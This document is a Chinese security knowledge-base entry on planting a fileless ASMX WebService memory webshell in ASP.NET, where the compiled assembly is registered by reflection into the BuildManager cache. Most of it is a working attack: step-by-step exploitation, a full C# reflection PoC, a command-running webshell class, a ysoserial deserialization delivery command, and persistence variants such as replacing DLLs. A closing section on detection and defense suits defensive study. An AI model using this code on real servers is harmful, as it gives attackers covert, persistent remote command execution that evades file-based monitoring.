---
id: web-dotnet-csharpcodeprovider-asmx-memshell-cache-injection
title: CSharpCodeProvider 内存编译 + BuildManager 缓存注入的 ASMX WebService 内存马
type: scenario
domain: web
path: web/dotnet
technique: dotnet-asmx-memshell-buildmanager-cache
tags:
- dotnet
- aspnet
- asmx
- webservice
- memshell
- csharpcodeprovider
- buildmanager
- reflection
- persistence
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V14
  verified_at: '2026-11-05T01:40:55+08:00'
  notes: 已对照原文与21张图核对；内存编译、GetType仅查referencedAssemblies、缓存注入链、无asmx亦可访问、缓存枚举检测均一致；原文仅测试.NET Framework 4.7.2/ASP.NET 4.8.4494.0未给受影响区间，已清除affected_versions；未复现PoC
url: /docs/web/dotnet/web-dotnet-csharpcodeprovider-asmx-memshell-cache-injection/
draft: false
kb_aliases:
- .NET WebService 内存马
- ASMX 内存马
- BuildManager 缓存注入
- CSharpCodeProvider 内存编译
- CacheVPathBuildResult 利用
- ASP.NET 无文件 Webshell
---

## 一句话结论

在已能执行 C# 的 ASP.NET 应用中，用 `CSharpCodeProvider` 把恶意 WebService 源码编译成内存程序集（`GenerateInMemory=true`、`OutputAssembly=""`），再反射调用 `BuildManager.CacheVPathBuildResultInternal`，把该程序集的 `BuildResultCompiledType` 按一个虚拟 `.asmx` 路径写入 ASP.NET 构建缓存；之后请求该 `.asmx` 即可路由到内存中的 WebService，无需落地 DLL 或 asmx 文件。

## 原理

- `CSharpCodeProvider.CompileAssemblyFromSource(CompilerParameters, source)` 可动态编译 C#；`GenerateInMemory=true` 且 `OutputAssembly=""` 时，程序集只在内存中，`CompilerResults.CompiledAssembly` 即该程序集。
- 正常 ASMX 路由：`WebServiceHandlerFactory.GetHandler` → `GetCompiledType(url)` → `BuildManager.GetVPathBuildResult` → `CompileWebFile` → 根据 `.asmx` 扩展创建 `WebServiceBuildProvider` → `GetBuildResult` → `GetGeneratedType` → `GetType`。
- `GetType` 只在 `referencedAssemblies`（`System.Web`、`System`、`bin` 目录下 DLL 等）中查找类型；纯内存程序集不在这个集合里，所以直接请求 asmx 会报“未能创建类型”（0x80004005 类解析错误）。
- 缓存注入绕过：`GetVPathBuildResultInternal` 第一步先从缓存取 `BuildResult`；如果命中就直接返回，不再经过上面的类型查找。攻击者可以手工构造这个 `BuildResult`：
  1. 反射创建 `System.Web.Compilation.BuildProvidersCompiler`（internal 构造函数，参数为 `VirtualPath` 和输出程序集名）；
  2. 反射调用 `BuildManager.CreateBuildProvider(virtualPath, compConfig, referencedAssemblies, true)` 得到 `SimpleHandlerBuildProvider`；
  3. 创建 `WebServiceParser(virtualPath)`，把 `_typeName` 设为恶意类型全名、`_sourceString` 设为非空字符串（`HasInlineCode` 为 true，`GetGeneratedType` 才会用 `CompilerResults.CompiledAssembly` 而不是去 referenced assemblies 找）；
  4. 把 parser 赋给 provider 的 `_parser` 字段，调用 `BuildProvider.GetBuildResult(compilerResults)` 得到 `BuildResultCompiledType`；
  5. 反射取 `BuildManager._theBuildManager`，调用 `CacheVPathBuildResultInternal(virtualPath, buildResult, DateTime.UtcNow)` 写入缓存。
- 缓存写入后，请求 `/xxx.asmx` 时 `GetVPathBuildResult` 直接命中缓存，返回恶意类型；实际文件不存在也可以访问（`VirtualPath` 只作为缓存 key，`GetVPathBuildResultInternal` 之后会把它从内部 Set 删除，所以只查 VirtualPath 检测不到）。
- 该内存马随应用池回收/进程重启消失；若需持久化，可改用落地 DLL/asmx 或替换现有 DLL 的方式（见变体），但会留下文件痕迹。

## 触发条件

- 目标为 ASP.NET（.NET Framework 4.x）应用，运行在 Full Trust（服务器默认）下，能够反射访问 `System.Web` 内部类型。
- 攻击者已有一个 C# 代码执行入口（反序列化、上传后编译、模板/表达式执行等），可在应用进程内运行任意 C#。
- 应用加载了 `System.Web`、`System.Web.Services` 等程序集；恶意源码引用的依赖在 `referencedAssemblies` 或已加载程序集中可解析。
- 目标存在可用的 `.asmx` 路由（或至少 `WebServiceHandlerFactory` 可用）；应用未禁用动态编译/缓存机制。
- 若通过反序列化投递，需要相应的 gadget（原文用 `XamlAssemblyLoadFromFile`）。

## 利用步骤

1. 准备恶意 WebService 源码：带 `[WebService]`、`[WebMethod]` 的类，方法内执行命令/回显。
2. 用 `CSharpCodeProvider` 编译：`GenerateInMemory=true`、`GenerateExecutable=false`、`OutputAssembly=""`，添加 `System.dll`、`System.Web.dll`、`System.Web.Services.dll` 及业务依赖。
3. 构造 `VirtualPath`（如 `/spd.asmx`），反射创建 `BuildProvidersCompiler`，取出 `_compConfig`、`_referencedAssemblies`。
4. 反射调用 `BuildManager.CreateBuildProvider` 得到 provider；创建 `WebServiceParser`，设置 `_typeName`、`_sourceString`，赋给 provider 的 `_parser`。
5. 调用 `BuildProvider.GetBuildResult(compilerResults)` 得到 `BuildResultCompiledType`。
6. 反射取 `BuildManager._theBuildManager`，调用 `CacheVPathBuildResultInternal` 写入缓存。
7. 请求 `/spd.asmx`（或其 WebMethod 路径，如 `/spd.asmx/gdll`）验证执行。
8. 若需持久化，改用落地 DLL/asmx 或替换现有 DLL；纯内存方式在应用池回收后失效，需重新注入。

## PoC

恶意 WebService 源码（示意）：

```csharp
using System;
using System.Diagnostics;
using System.Web.Services;

namespace spd
{
    [WebService(Namespace = "http://tempuri.org/")]
    [WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
    [System.ComponentModel.ToolboxItem(false)]
    public class gWebService : System.Web.Services.WebService
    {
        [WebMethod]
        public string gdll()
        {
            Process.Start("calc");
            return "Hello World";
        }
    }
}
```

内存编译 + 缓存注入（核心反射序列，省略错误处理）：

```csharp
var provider = new Microsoft.CSharp.CSharpCodeProvider();
var cp = new CompilerParameters {
    GenerateInMemory = true,
    GenerateExecutable = false,
    CompilerOptions = "/optimize",
    IncludeDebugInformation = false,
    OutputAssembly = ""
};
cp.ReferencedAssemblies.Add("System.dll");
cp.ReferencedAssemblies.Add("System.Web.dll");
cp.ReferencedAssemblies.Add("System.Web.Services.dll");
CompilerResults results = provider.CompileAssemblyFromSource(cp, source);

Assembly asm = typeof(System.Web.Compilation.BuildProvider).Assembly;
Type vpType = asm.GetType("System.Web.VirtualPath");
object vp = vpType.GetMethod("Create", new[] { typeof(string) })
                .Invoke(null, new object[] { "/spd.asmx" });

Type bpcType = asm.GetType("System.Web.Compilation.BuildProvidersCompiler");
object bpc = bpcType.GetConstructor(
    BindingFlags.NonPublic | BindingFlags.Instance, null,
    new[] { vpType, typeof(string) }, null)
    .Invoke(new object[] { vp, "aaaaaaa" });

object compConfig = bpcType.GetField("_compConfig", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(bpc);
object refs = bpcType.GetField("_referencedAssemblies", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(bpc);

object buildProvider = typeof(System.Web.Compilation.BuildManager)
    .GetMethod("CreateBuildProvider", BindingFlags.NonPublic | BindingFlags.Static, null,
        new[] { vpType, typeof(System.Web.Compilation.CompilationSection), typeof(System.Collections.ICollection), typeof(bool) }, null)
    .Invoke(null, new object[] { vp, compConfig, refs, true });

Type shbpType = asm.GetType("System.Web.Compilation.SimpleHandlerBuildProvider");
Type parserType = typeof(System.Web.Compilation.WebServiceParser);
object parser = parserType.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null,
        new[] { typeof(string) }, null)
    .Invoke(new object[] { "/spd.asmx" });

typeof(System.Web.Compilation.SimpleWebHandlerParser)
    .GetField("_typeName", BindingFlags.NonPublic | BindingFlags.Instance)
    .SetValue(parser, "spd.gWebService");
typeof(System.Web.Compilation.SimpleWebHandlerParser)
    .GetField("_sourceString", BindingFlags.NonPublic | BindingFlags.Instance)
    .SetValue(parser, " ");   // 非空，HasInlineCode=true

shbpType.GetField("_parser", BindingFlags.NonPublic | BindingFlags.Instance)
    .SetValue(buildProvider, parser);

object buildResult = typeof(System.Web.Compilation.BuildProvider)
    .GetMethod("GetBuildResult", BindingFlags.NonPublic | BindingFlags.Instance)
    .Invoke(buildProvider, new object[] { results });

object buildManager = typeof(System.Web.Compilation.BuildManager)
    .GetField("_theBuildManager", BindingFlags.Static | BindingFlags.NonPublic)
    .GetValue(null);
typeof(System.Web.Compilation.BuildManager)
    .GetMethod("CacheVPathBuildResultInternal", BindingFlags.NonPublic | BindingFlags.Instance)
    .Invoke(buildManager, new object[] { vp, buildResult, DateTime.UtcNow });
```

投递（原文用 ysoserial 的 BinaryFormatter + XamlAssemblyLoadFromFile gadget 执行上述 C#）：

```powershell
./ysoserial.exe -f binaryformatter -g XamlAssemblyLoadFromFile `
  -c "./payload.cs;./dlls/System.dll;./dlls/System.Web.dll;System.Core.dll;System.Configuration.dll"
```

访问验证：

```http
GET /spd.asmx/gdll HTTP/1.1
Host: target
```

正常返回 `Hello World` 即说明内存 WebService 已注册（实际命令执行按 `gdll` 内的代码）。

说明：

- 上述反射依赖 `System.Web` 内部类型与字段名（`_compConfig`、`_referencedAssemblies`、`_parser`、`_typeName`、`_sourceString`、`_theBuildManager`），不同 .NET Framework 版本可能变化，需按目标版本核对。
- `_sourceString` 必须非空，否则 `HasInlineCode=false`，会退回 referenced assemblies 查找并失败。
- 纯内存方式不落地文件，但应用池回收/进程重启后失效；需要持久化时改用文件方式。

## 变体与关联

- 变体：落地 `bin/sp.dll` + 写一个引用该类型的 `.asmx`，利用 ASP.NET 对 `bin` 目录变动的重启机制生效；缺点是 DLL 和 asmx 都会落地，易被文件监控发现。
- 变体：把输出路径设为已有 DLL（覆盖/替换），站点重启后加载被篡改的 DLL；可能破坏业务逻辑，风险高。
- 变体：其他缓存 key/处理器（`.ashx`、`.aspx`）对应不同的 `BuildProvider`/`Parser`，思路相同，需替换类型与字段。
- 变体：其他 .NET 内存马机制：`Assembly.Load(byte[])` + `AppDomain.AssemblyResolve` 动态加载、动态注册 `HttpModule`/`HttpHandler`、`RouteTable` 注入等；本卡聚焦 ASMX 构建缓存。
- 关联：[[web-dotnet-deser-erp-openserverdialog-binaryformatter-rce]]、[[web-dotnet-deser-servicehandler-typenamehandling]]（代码执行/反序列化投递入口）。
- 关联：[[web-dotnet-iis-webdav-put-move-webshell]]（文件落地型 .NET Webshell，作为持久化对比）。

## 检测与防御

- 检测：反射枚举 `HttpRuntime.Cache` 的内部 `_internalCache`，找出 `BuildResultCompiledType` 条目，打印 key、`_builtType` 与对应虚拟路径；对比缓存中的 `.asmx` 与实际文件，发现“缓存有、文件无”的条目；按 key 调用 `Remove` 清除。
- 检测：监控 `CSharpCodeProvider.CompileAssemblyFromSource`、`Assembly.Load(byte[])`、`BuildManager.CacheVPathBuildResultInternal`、`_theBuildManager` 反射访问；.NET ETW/AMSI/EDR 规则可覆盖这些行为。
- 检测：请求不存在的 `.asmx` 却返回 200/业务 XML；`/xxx.asmx/<method>` 访问模式异常；应用池回收前后行为变化（内存马消失）。
- 防御：最小化代码执行入口（修复反序列化/上传/表达式注入）；启用 PrecompiledApp/预编译站点，减少运行时动态编译；限制 Full Trust；使用 AppLocker/WDAC 与 EDR 监控动态编译和程序集加载。
- 防御：对 `bin`、`App_Code`、`web.config` 做完整性监控；应用池定期回收只能清除内存马，不能替代入口修复。
- 响应：先枚举/导出缓存证据，再回收应用池；检查是否有落地 DLL/asmx 或现有 DLL 被替换；排查反序列化/上传日志与异常请求。
